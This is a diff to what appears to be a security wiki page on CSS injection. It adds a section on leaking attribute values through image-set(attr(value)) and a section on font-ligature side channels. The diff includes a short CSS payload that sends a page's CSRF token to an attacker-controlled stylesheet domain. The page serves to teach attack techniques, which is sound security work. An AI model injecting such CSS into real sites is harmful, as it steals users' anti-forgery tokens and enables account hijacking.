@@ -123,6 +123,18 @@ One requirement for this `@import` chain attack is that your input is at the _st
 Explanation of @import chaining
 {% endembed %}
 
+### One-shot with `attr()`
+
+Due to [a recent update](https://developer.chrome.com/blog/advanced-attr) to the attr() function in CSS, it is possible to get a value of an attribute into a CSS variable. This means it can be used in a function like [`image-set()`](https://developer.mozilla.org/en-US/docs/Web/CSS/image/image-set) to load its value as a relative URL. If the stylesheet was loaded from an attacker's domain, the URL will be relative to the malicious stylesheet's domain:
+
+```css
+input[name="csrf"] {
+  background: image-set(attr(value))
+}
+```
+
+The beauty of this is that it can **leak arbitrarily large attributes all in this single request**. Read more about this find by [@slonser in this tweet](https://web.archive.org/web/20250514150052/https://unrollnow.com/status/1912060407344201738).
+
 ### One-shot using 'contains' operator
 
 While most techniques for leaking attributes do it one character at a time with the _prefix_ operator (`^=`), there is also the _contains_ operator (`*=`). By writing many partial substrings of text, you can find which ones exist on the target page and then combine them on the server into a single string. This makes it possible to leak an entire string from one single injection. It was the solution to the following challenge, with a writeup below:
@@ -148,6 +160,14 @@ In cases where you are testing for an injection without knowing where it will en
 {% embed url="https://portswigger.net/research/blind-css-exfiltration" %}
 Leak structure of unknown data
 {% endembed %}
+
+### Font ligatures
+
+[Ligatures](https://en.wikipedia.org/wiki/Ligature_\(writing\)) are multiple characters that form a single character in a specific font. By loading a custom-created font with carefully crafted ligatures if varying sizes in CSS, you can measure the width conditionally using media queries. This allows you to determine which character are on a page, and which come after it using ligatures.
+
+The tool below implements all this logic incredibly and has some features for inlining fonts as well with the `/static` endpoint. Check out the blog post to understand how it works:
+
+{% embed url="https://adragos.ro/fontleak/" %}
 
 ## CSP Bypasses
 
